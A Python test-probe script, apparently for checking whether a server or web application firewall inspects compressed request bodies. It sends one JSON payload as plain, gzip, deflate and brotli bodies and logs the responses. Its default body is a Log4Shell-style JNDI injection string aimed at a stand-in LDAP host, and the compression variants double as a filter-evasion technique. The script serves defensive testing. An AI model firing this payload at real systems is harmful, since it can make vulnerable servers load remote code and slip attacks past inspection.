#!/usr/bin/env python3
from __future__ import annotations

import argparse
import gzip
import json
import zlib
from pathlib import Path

from http_probe_common import curl_request, dump_json, ensure_dir, write_csv

try:
    import brotli  # type: ignore
except Exception:  # pragma: no cover
    brotli = None


def write_bytes(path: Path, data: bytes) -> None:
    path.write_bytes(data)


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-18 compressed body inspection probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--json-body", default='{"q":"${jndi:ldap://probe.invalid/tc18}"}')
    parser.add_argument("--method", default="POST")
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    plain_bytes = args.json_body.encode("utf-8")
    cases: list[tuple[str, bytes, list[str]]] = [
        ("plain", plain_bytes, ["Content-Type: application/json"]),
        ("gzip", gzip.compress(plain_bytes), ["Content-Type: application/json", "Content-Encoding: gzip"]),
        ("deflate", zlib.compress(plain_bytes), ["Content-Type: application/json", "Content-Encoding: deflate"]),
    ]
    if brotli is not None:
        cases.append(
            ("br", brotli.compress(plain_bytes), ["Content-Type: application/json", "Content-Encoding: br"])
        )

    rows: list[dict[str, str]] = []
    summary = {"url": args.url, "plain_size": len(plain_bytes), "cases": []}
    for name, body_bytes, headers in cases:
        body_path = out_dir / f"{name}.payload"
        write_bytes(body_path, body_bytes)
        result = curl_request(
            url=args.url,
            out_prefix=out_dir / name,
            method=args.method,
            headers=headers,
            body_path=body_path,
            timeout=args.timeout,
        )
        metadata = {
            "case": name,
            "content_encoding": next((h.split(":", 1)[1].strip() for h in headers if h.lower().startswith("content-encoding:")), "identity"),
            "plain_size": len(plain_bytes),
            "encoded_size": len(body_bytes),
            "size_ratio": round(len(body_bytes) / len(plain_bytes), 3) if plain_bytes else 0,
            "result": result,
        }
        dump_json(out_dir / f"{name}.meta.json", metadata)
        summary["cases"].append(metadata)
        rows.append(
            {
                "case": name,
                "content_encoding": metadata["content_encoding"],
                "plain_size": str(metadata["plain_size"]),
                "encoded_size": str(metadata["encoded_size"]),
                "http_code": result["http_code"],
                "server_header": result["server_header"],
                "body_fingerprint": result["body_fingerprint"],
                "header_path": result["header_path"],
                "body_path": result["body_path"],
            }
        )

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        ["case", "content_encoding", "plain_size", "encoded_size", "http_code", "server_header", "body_fingerprint", "header_path", "body_path"],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
